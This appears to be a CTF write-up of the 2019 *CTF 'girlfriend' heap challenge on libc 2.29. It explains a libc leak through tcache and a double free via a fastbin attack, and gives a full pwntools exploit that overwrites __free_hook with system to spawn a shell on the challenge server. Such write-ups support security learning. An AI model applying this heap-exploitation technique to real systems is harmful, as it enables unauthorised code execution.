---
title: Starctf2019_Girlfriend
date: 2019-04-29 09:59:25
tags:
---
libc 2.29+double free
new libc new life
<!--more-->
# start 
[binary][1]

题目还是简单的主要是涉及`libc2.29`
环境问题比赛前一定要弄好...
我之前搞过2.29所以对检查还是挺熟悉的...
本来有机会拿一血的可惜不知为啥ubunu19.04虚拟机太卡了...然后用上题目的libc也用了1个小时...
拿个了5血...还是`docker`大法好...
# Analysis
普通菜单题.有`show`,`add`,`del`功能
结构体长这样
```s
00000000 node            struc ; (sizeof=0x18, mappedto_6)
00000000 name            dq ?
00000008 size            dd ?
0000000C call            db 12 dup(?)
00000018 node            ends
```
checksec:
```
[*] '/home/n132/Desktop/gf/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
# 漏洞
## leak
直接利用show来泄露.
泄露`libc`:`free()` 7次填满`tcache`注意这里有`double`的检测感兴趣的可以看看源码..主要绕过就是`free`不同的`chunk`
例如:
```python
for x in range(8):
    add(0x88)
add(0x1)
for x in range(8):
    free(x)
show(8)
```
## double free
```arm
 if ( list[idx] )
    free((void *)list[idx]->name);
```
存在`uaf` 绕过`libc 2.29 tcache`关于`double free`的检测可以通过填满tcahce 从而利用`fastbin atk`
例如
```python
for x in range(9):
	add(0x68)#idx=9~17
for x in range(8):
	free(9+x)
free(17)
free(16)

for x in range(7):
	add(0x68,'/bin/sh\00')
add(0x68,p64(0x3b38c8+base))#hijack __free_hook=>system
```

# 思路
* leak libc
* hijack freehook++++>system

# exp
```python
from pwn import *
def cmd(c):
    p.sendlineafter("e:",str(c))
def add(size=0x88,name="W",call=p64(0x10086)):
    cmd(1)
    p.sendlineafter("name",str(size))
    p.sendafter("name:",name)
    p.sendlineafter("call:",call)
def show(idx):
    cmd(2)
    p.sendlineafter("index:",str(idx))
def free(idx):
    cmd(4)
    p.sendlineafter("index:\n",str(idx))
p=remote("34.92.96.238",10001)
for x in range(8):
	add(0x88)#0
for x in range(8):
	free(7-x)
add(0x18)
show(8)
p.readuntil("name:\n")
base=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7fb0a57-0x7ffff7dce000)-(0x7ffff7dd0200-0x7ffff7dce000
)-(0x00007ffff7a1f000-0x7ffff7bec000)-(0x7ffff7db9000-0x7ffff7a1f000)
log.warning(hex(base))
for x in range(9):
	add(0x68)#9-17
for x in range(8):
	free(9+x)
free(17)
free(16)

for x in range(7):
	add(0x68,'/bin/sh\00')
__free_hook=0x3b38c8+base
add(0x68,p64(__free_hook))
add(0x68)
add(0x68)
context.log_level='debug'
sys=0x41c30+base
#gdb.attach(p)
add(0x68,p64(sys))
free(20)
p.interactive()
```

# tip
* 在`tcache`下还是`__free_hook`====>`system`好用
* 家中常备个版本`desktop`或者`docker container`


[1]:https://github.com/n132/Watermalon/tree/master/Starctf_2019